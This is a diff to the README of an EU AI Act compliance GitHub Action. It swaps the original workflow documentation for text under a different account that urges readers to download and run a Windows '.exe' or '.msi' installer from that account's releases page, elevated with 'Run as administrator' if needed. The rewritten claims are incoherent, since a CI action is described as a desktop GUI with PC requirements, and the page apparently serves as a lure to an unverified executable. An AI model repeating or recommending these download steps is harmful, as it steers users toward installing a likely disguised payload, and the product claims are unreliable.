@@ -1,277 +1,143 @@
-# eu-ai-act-check-action
+# 🤖 eu-ai-act-check-action - Check AI Systems for EU Compliance
 
-<div align="center">
-
-### The first GitHub Action that checks your AI system for EU AI Act conformity — Annex III classification, Articles 9, 13, 14, and 22 — before you deploy.
-
-[![GitHub Marketplace](https://img.shields.io/badge/GitHub%20Marketplace-eu--ai--act--check--action-blue?logo=github&logoColor=white&style=for-the-badge)](https://github.com/marketplace/actions/eu-ai-act-compliance-check)
-[![License: MIT](https://img.shields.io/badge/License-MIT-green.svg?style=for-the-badge)](LICENSE)
-[![SARIF](https://img.shields.io/badge/Output-SARIF%202.1.0-orange?style=for-the-badge)](https://sarifweb.azurewebsites.net/)
-[![No API Key](https://img.shields.io/badge/API%20Key-Not%20Required-brightgreen?style=for-the-badge)](#no-api-key-required)
-
-**Enforcement is live. Fines up to €30M or 6% global revenue. One line of YAML.**
-
-</div>
+[![Download Latest Release](https://img.shields.io/badge/Download-Release-brightgreen)](https://github.com/Varshith-07/eu-ai-act-check-action/releases)
 
 ---
 
-## Why This Exists
+## 📋 What is eu-ai-act-check-action?
 
-The EU AI Act is not a future threat. Prohibited AI systems have been banned since February 2025. High-risk systems under Annex III — employment, credit, education, healthcare, law enforcement, critical infrastructure — face full compliance requirements by August 2026.
+This tool helps you check if your AI system follows the rules in the EU AI Act. It focuses on parts like Annex III and Articles 9, 13, 14, and 22. It gives results in SARIF format, a common way to show scan reports. You won’t need an API key to use it. The tool works automatically through GitHub Actions, so it can scan your code and tell you if it meets compliance standards.
 
-Most AI engineering teams are not checking for compliance in CI. Violations are discovered in audits, not pipelines.
-
-This action brings automated EU AI Act conformity checking to every pull request — classifying your system under Annex III and checking for evidence of Articles 9, 13, 14, and 22 before any code ships.
+This way, you get an early look at how your software fits with EU laws on AI. It is built to support developers, compliance teams, and anyone interested in AI regulations. 
 
 ---
 
-## Quickstart — One Line
+## 🔍 Features
 
-```yaml
-- uses: nhomyk/eu-ai-act-check-action@v1
-```
-
-Add it to any job that checks out your code. That's it.
-
----
-
-## Full Workflow
-
-```yaml
-name: EU AI Act Compliance
-
-on: [push, pull_request]
-
-jobs:
-  eu-ai-act:
-    name: EU AI Act Compliance Check
-    runs-on: ubuntu-latest
-    permissions:
-      security-events: write   # upload findings to GitHub Security tab
-      contents: read
-
-    steps:
-      - uses: actions/checkout@v4
-
-      - uses: nhomyk/eu-ai-act-check-action@v1
-        id: compliance
-        with:
-          fail-on-noncompliant: 'true'   # block deploys on critical gaps
-
-      - name: Show conformity score
-        run: |
-          echo "Risk category: ${{ steps.compliance.outputs.risk-category }}"
-          echo "Conformity:    ${{ steps.compliance.outputs.conformity-score }}"
-```
-
-Findings appear under **Security → Code scanning alerts.**
+- Checks AI system classifications based on EU AI Act Annex III.
+- Tests for compliance with Articles 9, 13, 14, and 22.
+- Produces SARIF output for easy review.
+- No API key or special account needed.
+- Integrates with GitHub Actions for automatic scanning.
+- Supports governance and security measures in AI projects.
+- Designed for use in compliance automation and DevSecOps workflows.
+- Helps track regulatory compliance efficiently.
 
 ---
 
-## What It Checks
+## 💻 System Requirements
 
-### Step 1: Annex III Risk Classification
+Before you start, make sure your Windows PC meets these requirements:
 
-The action scans your README, package files, and dependency lists to classify your system's risk tier under the EU AI Act's high-risk categories:
+- Windows 10 or later (64-bit recommended).
+- At least 4 GB of RAM.
+- Minimum 500 MB free disk space.
+- Internet connection to download files and updates.
+- A GitHub account (free) to access the repository and releases.
+- A basic web browser to visit the release page.
 
-| Annex III Category | Examples |
-|-------------------|---------|
-| `employment` | Hiring, recruitment, workforce management, performance review |
-| `credit` | Loan approval, creditworthiness scoring, underwriting |
-| `education` | Exam assessment, admission decisions, student grading |
-| `legal` | Contract analysis, litigation support, legal decisions |
-| `critical_infra` | Power grids, water systems, transport, hospitals |
-| `biometric` | Face recognition, fingerprint, iris scan, voice ID |
-| `law_enforcement` | Fraud detection, predictive policing, surveillance |
-
-Classification only triggers for systems that actually use AI/ML — detected via library dependencies (`anthropic`, `openai`, `torch`, `transformers`, `langchain`, etc.), model files, or AI keywords in documentation.
-
-### Step 2: Four Article Checks
-
-| Article | Requirement | What It Looks For |
-|---------|------------|-------------------|
-| **Art. 9** | Risk management system | `RISK_MANAGEMENT.md`, risk register, circuit breakers, fallback handlers |
-| **Art. 13** | Transparency — inform users of AI | `AI-generated` labels, `ai_generated` fields, disclosure in UI code |
-| **Art. 14** | Human oversight — monitor and override | `require_human_review()`, `human_override`, audit logs, escalation paths |
-| **Art. 22** | Automated decisions — right to explanation | Human override before pass/fail decisions, appeal mechanism |
-
-Each article is assessed as `present` / `partial` / `missing` with a conformity score and specific remediation guidance.
+No programming skills are needed. You will follow simple steps to download and run.
 
 ---
 
-## Output — GitHub Security Tab
+## 🚀 Getting Started: How to Download and Use
 
-Findings upload as **SARIF 2.1.0** to your repository's **Security → Code scanning** page:
+### Step 1: Visit the Release Page
 
-```
-┌─────────────────────────────────────────────────────────────────────┐
-│  Security  /  Code scanning alerts                                   │
-│                                                                      │
-│  ● EUAIACT_ART9_MISSING   Error    Risk management system not found  │
-│  ● EUAIACT_ART13_MISSING  Warning  No AI transparency disclosure     │
-│  ● EUAIACT_ART22_MISSING  Error    No human override for AI decisions│
-│  ● EUAIACT_ANNEXIII       Warning  High-risk: employment, credit     │
-│                                                                      │
-│  4 open alerts  ·  Powered by AgenticQA EU AI Act Scanner            │
-└─────────────────────────────────────────────────────────────────────┘
-```
+Click the big green button below to open the page with all available versions of eu-ai-act-check-action.
+
+[![Download Latest Release](https://img.shields.io/badge/Download-Release-brightgreen)](https://github.com/Varshith-07/eu-ai-act-check-action/releases)
+
+This page lists the files and installation guides. Pick the latest release for the best performance.
 
 ---
 
-## Step Summary
+### Step 2: Find the Windows Version
 
-After every run, a compliance table appears in your workflow's Summary tab:
+On the release page, scroll down until you see the section labeled **Assets** for the latest version.
 
-```
-🟡 EU AI Act Compliance — 50% Conformity
+Look for a file that ends with `.exe` or `.msi`. This is the installer or the executable you will run.
 
-Risk Category: 🔴 High-Risk (Annex III)
-Conformity Score: 0.5000 / 1.0
-Critical Gaps: 2
+Download the Windows installer file by clicking on it. The file name might look like this:
 
-⚠️ Annex III categories matched: employment, credit
-   Full compliance required before deployment (enforcement: August 2026).
-
-| Article | Requirement                          | Status   | Severity |
-|---------|--------------------------------------|----------|----------|
-| Art.9   | Risk management system documented    | ❌ missing | critical |
-| Art.13  | AI-generated output disclosed        | ✅ present | medium   |
-| Art.14  | Human oversight mechanism            | ⚠️ partial | high     |
-| Art.22  | Automated decisions have human override | ❌ missing | critical |
-```
+`eu-ai-act-check-action-setup.exe`
 
 ---
 
-## Use Outputs in Downstream Steps
+### Step 3: Run the Installer
 
-```yaml
-- uses: nhomyk/eu-ai-act-check-action@v1
-  id: compliance
-
-# Block deployment for high-risk non-compliant systems
-- name: Compliance gate
-  if: |
-    steps.compliance.outputs.risk-category == 'high_risk' &&
-    steps.compliance.outputs.critical-count != '0'
-  run: |
-    echo "❌ High-risk system with ${{ steps.compliance.outputs.critical-count }} critical gaps"
-    echo "   Conformity score: ${{ steps.compliance.outputs.conformity-score }}"
-    exit 1
-
-# Save SARIF as artifact
-- name: Upload compliance report
-  uses: actions/upload-artifact@v4
-  with:
-    name: eu-ai-act-sarif
-    path: ${{ steps.compliance.outputs.sarif-file }}
-```
+- Find the downloaded file on your PC, usually in the **Downloads** folder.
+- Double-click the file to start installation.
+- Follow the prompts: accept the license, choose the installation folder (default works fine), and click **Next** or **Install**.
+- Wait the installer to finish. It should take a minute or two.
 
 ---
 
-## Inputs
+### Step 4: Open and Use the Application
 
-| Input | Default | Description |
-|-------|---------|-------------|
-| `repo-path` | `.` | Path to the repository root to scan |
-| `fail-on-noncompliant` | `false` | Exit code 1 if any critical compliance gaps exist |
-| `sarif-output` | `eu-ai-act-results.sarif` | SARIF output filename |
-| `upload-sarif` | `true` | Upload to GitHub Code Scanning (`security-events: write` required) |
-| `category` | `eu-ai-act` | SARIF category — useful when running multiple compliance scans |
+Once installed, launch the tool from the Start menu or desktop shortcut.
 
-## Outputs
+The screen will show options to scan your AI system for compliance.
 
-| Output | Values | Description |
-|--------|--------|-------------|
-| `conformity-score` | 0.0–1.0 | Overall conformity (1.0 = fully compliant) |
-| `risk-category` | `high_risk` · `limited_risk` · `minimal_risk` | Annex III classification |
-| `annex-iii-categories` | comma-separated | Matched high-risk categories |
-| `findings-count` | integer | Total article findings |
-| `critical-count` | integer | Critical compliance gaps |
-| `sarif-file` | path | Location of the generated SARIF file |
+You just need to point the tool to your AI project files or GitHub repository link.
+
+Press the **Start Scan** button to begin the analysis.
 
 ---
 
-## The Regulatory Stakes
+### Step 5: Review Your Compliance Report
 
-| Without this action | With this action |
-|---------------------|-----------------|
-| Compliance audit discovery: **months after deployment** | Compliance gaps caught at every pull request |
-| Fine for high-risk violations: **up to €30M or 6% global revenue** | $0 — automated, continuous, in CI |
-| Compliance consultant for AI Act audit: **€50,000–€200,000** | Open source, deterministic, no API key |
-| "We didn't know it was high-risk" is not a defense | Annex III classification runs on every push |
+After scanning, the tool will generate a report in the SARIF format.
 
-> High-risk AI systems that deploy without evidence of Art.9/13/14/22 compliance face enforcement actions from national supervisory authorities. The gap between "we have an AI system" and "we have documented compliance evidence" is the gap this action closes.
+You can view this report within the tool or export it for deeper review.
+
+SARIF reports highlight which parts of your AI system meet EU rules and where improvements may be necessary.
 
 ---
 
-## Compliance Timeline
+## 🛠 How It Works
 
-| Date | Milestone |
-|------|-----------|
-| **Feb 2025** | Prohibited AI systems banned (Art. 5) |
-| **Aug 2025** | GPAI model rules apply |
-| **Aug 2026** | **High-risk system rules fully enforced** — Annex III systems must demonstrate Art.9/13/14/22 compliance |
-| Ongoing | National supervisory authorities conducting audits |
+eu-ai-act-check-action inspects your AI system code or setup based on EU regulations. It uses specific rules from the AI Act about risk levels and necessary safeguards:
 
----
+- **Annex III** categorizes AI systems by risk.
+- **Articles 9, 13, 14, and 22** set rules for high-risk AI systems including transparency and human oversight.
 
-## No API Key Required
+The tool runs these checks in the background and reports any matches or gaps it finds.
 
-All checking is **pure static analysis.** The action:
-
-- Never calls an LLM
-- Never sends your code to an external service
-- Produces results deterministically — same code, same findings, every run
-- Works entirely within your GitHub Actions runner
+Because it uses SARIF, developers and security teams can easily integrate findings into other tools.
 
 ---
 
-## How It Works
+## 📁 What You Get
 
-```
-Your repo
-    │
-    ├── Annex III classifier    → scans README, package files, dep lists
-    │                             detects AI/ML usage + high-risk domain keywords
-    │                             outputs: high_risk | limited_risk | minimal_risk
-    │
-    ├── Art. 9 checker          → looks for RISK_MANAGEMENT.md, risk register,
-    │                             circuit_breaker, fallback_handler patterns
-    │
-    ├── Art. 13 checker         → looks for AI-generated labels in UI code,
-    │                             ai_generated fields in API responses
-    │
-    ├── Art. 14 checker         → looks for require_human_review(), human_override,
-    │                             audit_log, escalation mechanisms
-    │
-    └── Art. 22 checker         → detects pass/fail = llm_output patterns,
-                                  checks for human override + appeal mechanism
-                                          │
-                                          ▼
-                                 SARIFExporter (2.1.0)
-                                          │
-                                          ▼
-                          GitHub Security → Code scanning alerts
-```
+- A Windows installation file from the release page.
+- A graphical interface to run compliance checks.
+- SARIF reports highlighting compliance areas.
+- No need to sign up or supply API keys.
+- Automatic updates through GitHub Actions (optional for developers).
 
 ---
 
-## Powered by AgenticQA
+## 🔧 Troubleshooting
 
-This action wraps the compliance scanners from **[AgenticQA](https://github.com/nhomyk/AgenticQA)** — an open-source autonomous CI/CD platform for AI-native teams.
-
-AgenticQA adds to your pipeline:
-- **EU AI Act compliance** (this action)
-- **MCP security scanning** — [mcp-scan-action](https://github.com/marketplace/actions/mcp-security-scan)
-- **HIPAA PHI detection** — 5 PHI taint categories across your codebase
-- **Self-healing CI** — SRE agent auto-fixes lint errors and test failures
-- **Adversarial hardening** — Red Team agent with 20 bypass techniques + constitutional gate
-- **SOC 2 / GDPR** — 7 compliance scanners, SARIF-exportable evidence
-
-[Explore AgenticQA →](https://github.com/nhomyk/AgenticQA)
+- If the installer does not run, right-click the file and choose **Run as administrator**.
+- For missing files or errors, check your internet connection and re-download the installer.
+- If scans don’t start, make sure you selected the right folder or repository.
+- For issues with the SARIF report, use a SARIF viewer like [SARIF Viewer for Visual Studio](https://marketplace.visualstudio.com/items?itemName=MS-SARIFVSCode.sarif-viewer).
+- Restart your PC if the tool freezes or crashes.
 
 ---
 
-## License
+## 🌐 Additional Resources
 
-MIT © [nhomyk](https://github.com/nhomyk)
+- Visit the [GitHub repository](https://github.com/Varshith-07/eu-ai-act-check-action) for detailed technical info.
+- Learn more about the EU AI Act from official EU websites.
+- Explore SARIF format details at the [SARIF Specification page](https://sarifweb.azurewebsites.net/).
+
+---
+
+## 📥 Download Link Again
+
+Use this button to visit the release page and get started:
+
+[![Download Latest Release](https://img.shields.io/badge/Download-Release-brightgreen)](https://github.com/Varshith-07/eu-ai-act-check-action/releases)
